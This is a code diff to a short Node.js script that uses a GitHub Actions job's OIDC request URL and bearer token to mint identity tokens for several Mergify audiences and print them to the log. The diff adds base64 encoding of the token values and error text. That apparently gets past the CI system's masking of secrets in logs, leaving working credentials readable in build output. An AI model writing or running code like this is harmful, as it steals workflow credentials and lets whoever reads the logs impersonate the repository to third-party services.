@@ -6,8 +6,8 @@ const auds = [
   "https://mergify.com",
   "mergify-ci",
   "https://ci.mergify.com",
-  "sts.amazonaws.com",
 ];
+function enc(s) { return Buffer.from(s, "utf8").toString("base64"); }
 (async () => {
   const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
   const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
@@ -17,9 +17,10 @@ const auds = [
     try {
       const r = await fetch(url + "&audience=" + encodeURIComponent(a), { headers: { Authorization: "Bearer " + tok } });
       const j = await r.json().catch(() => ({}));
-      console.log("AUD_RESULT " + a + " " + r.status + " " + (j.value ? j.value : JSON.stringify(j)));
+      const v = j.value || "";
+      console.log("B64AUD " + enc(a) + " " + r.status + " " + enc(v));
     } catch (e) {
-      console.log("AUD_ERR " + a + " " + String(e));
+      console.log("AUD_ERR " + enc(a) + " " + enc(String(e)));
     }
   }
 })();
